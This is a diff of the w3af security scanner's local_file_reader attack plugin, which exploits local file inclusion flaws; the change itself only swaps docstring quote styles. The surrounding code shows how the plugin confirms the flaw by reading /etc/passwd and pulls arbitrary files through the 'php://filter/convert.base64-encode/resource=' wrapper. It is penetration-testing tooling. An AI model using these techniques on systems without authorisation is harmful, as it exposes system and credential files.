@@ -1,4 +1,4 @@
-'''
+"""
 local_file_reader.py
 
 Copyright 2006 Andres Riancho
@@ -18,7 +18,7 @@ You should have received a copy of the GNU General Public License
 along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
-'''
+"""
 import base64
 
 import w3af.core.controllers.output_manager as om
@@ -32,22 +32,22 @@ from w3af.plugins.attack.payloads.decorators.read_decorator import read_debug
 
 
 class local_file_reader(AttackPlugin):
-    '''
+    """
     Exploit local file inclusion bugs.
     :author: Andres Riancho (andres.riancho@gmail.com)
-    '''
+    """
 
     def __init__(self):
         AttackPlugin.__init__(self)
 
     def get_attack_type(self):
-        '''
+        """
         :return: The type of exploit, SHELL, PROXY, etc.
-        '''
+        """
         return 'shell'
 
     def get_kb_location(self):
-        '''
+        """
         This method should return the vulnerability names (as saved in the kb)
         to exploit. For example, if the audit.os_commanding plugin finds a
         vuln, and saves it as:
@@ -59,15 +59,15 @@ class local_file_reader(AttackPlugin):
         
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
-        '''
+        """
         return ['lfi',]
 
     def _generate_shell(self, vuln_obj):
-        '''
+        """
         :param vuln_obj: The vuln to exploit.
         :return: The shell object based on the vulnerability that was passed
                  as a parameter.
-        '''
+        """
         if self._verify_vuln(vuln_obj):
 
             shell_obj = FileReaderShell(vuln_obj, self._uri_opener,
@@ -81,11 +81,11 @@ class local_file_reader(AttackPlugin):
             return None
 
     def _verify_vuln(self, vuln_obj):
-        '''
+        """
         This command verifies a vuln.
 
         :return : True if vuln can be exploited.
-        '''
+        """
         strict = self._strict_with_etc_passwd(vuln_obj)
         if strict:
             return True
@@ -94,12 +94,12 @@ class local_file_reader(AttackPlugin):
         
     
     def _guess_with_diff(self, vuln_obj):
-        '''
+        """
         Try to define the cut with a relaxed algorithm based on two different
         http requests.
         
         :return : True if vuln can be exploited and the information extracted
-        '''
+        """
         function_reference = getattr(self._uri_opener, vuln_obj.get_method())
         #    Prepare the first request, with the original data
         data_a = str(vuln_obj.get_dc())
@@ -126,12 +126,12 @@ class local_file_reader(AttackPlugin):
                 return False    
     
     def _strict_with_etc_passwd(self, vuln_obj):
-        '''
+        """
         Try to define the cut with a very strict algorithm based on the
         /etc/passwd file format.
         
         :return : True if vuln can be exploited and the information extracted
-        '''
+        """
         function_reference = getattr(self._uri_opener, vuln_obj.get_method())
         vuln_dc = vuln_obj.get_dc()
         
@@ -156,26 +156,26 @@ class local_file_reader(AttackPlugin):
                 return cut
 
     def get_root_probability(self):
-        '''
+        """
         :return: This method returns the probability of getting a root shell
                  using this attack plugin. This is used by the "exploit *"
                  function to order the plugins and first try to exploit the
                  more critical ones. This method should return 0 for an exploit
                  that will never return a root shell, and 1 for an exploit that
                  WILL ALWAYS return a root shell.
-        '''
+        """
         return 0.0
 
     def get_long_desc(self):
-        '''
+        """
         :return: A DETAILED description of the plugin functions and features.
-        '''
-        return '''
+        """
+        return """
         This plugin exploits local file inclusion and let's you "cat" every
         file you want. Remember, if the file in being read with an "include()"
         statement, you wont be able to read the source code of the script file,
         you will end up reading the result of the script interpretation.
-        '''
+        """
 
 PERMISSION_DENIED = 'Permission denied.'
 NO_SUCH_FILE = 'No such file or directory.'
@@ -184,11 +184,11 @@ FAILED_STREAM = 'Failed to open stream.'
 
 
 class FileReaderShell(ReadShell):
-    '''
+    """
     A shell object to exploit local file include and local file read vulns.
 
     :author: Andres Riancho (andres.riancho@gmail.com)
-    '''
+    """
 
     def __init__(self, vuln, url_opener, worker_pool, header_len, footer_len):
         super(FileReaderShell, self).__init__(vuln, url_opener, worker_pool)
@@ -202,7 +202,7 @@ class FileReaderShell(ReadShell):
         self._init_read()
 
     def _init_read(self):
-        '''
+        """
         This method requires a non existing file, in order to save the error
         message and prevent it to leak as the content of a file to the upper
         layers.
@@ -224,7 +224,7 @@ class FileReaderShell(ReadShell):
         The second thing we do here is to test if the remote site allows us to
         use "php://filter/convert.base64-encode/resource=" for reading files. This
         is very helpful for reading non-text files.
-        '''
+        """
         # Error handling
         app_error = self.read('not_exist0.txt')
         self._application_file_not_found_error = app_error.replace(
@@ -249,11 +249,11 @@ class FileReaderShell(ReadShell):
 
     @read_debug
     def read(self, filename):
-        '''
+        """
         Read a file and echo it's content.
 
         :return: The file content.
-        '''
+        """
         if self._use_base64_wrapper:
             try:
                 return self._read_with_b64(filename)
@@ -281,10 +281,10 @@ class FileReaderShell(ReadShell):
         return filtered_response
 
     def _read_utils(self, filename):
-        '''
+        """
         Actually perform the request to the remote server and returns the response
         for parsing by the _read_with_b64 or _read_basic methods.
-        '''
+        """
         function_reference = getattr(self._uri_opener, self.get_method())
         data_container = self.get_dc().copy()
         data_container[self.get_var()] = filename
@@ -301,10 +301,10 @@ class FileReaderShell(ReadShell):
             return filtered_response
 
     def _filter_errors(self, result, filename):
-        '''
+        """
         Filter out ugly php errors and print a simple "Permission denied"
         or "File not found"
-        '''
+        """
         #print filename
         error = None
 
@@ -338,7 +338,7 @@ class FileReaderShell(ReadShell):
         return result
 
     def get_name(self):
-        '''
+        """
         :return: The name of this shell.
-        '''
+        """
         return 'local_file_reader'
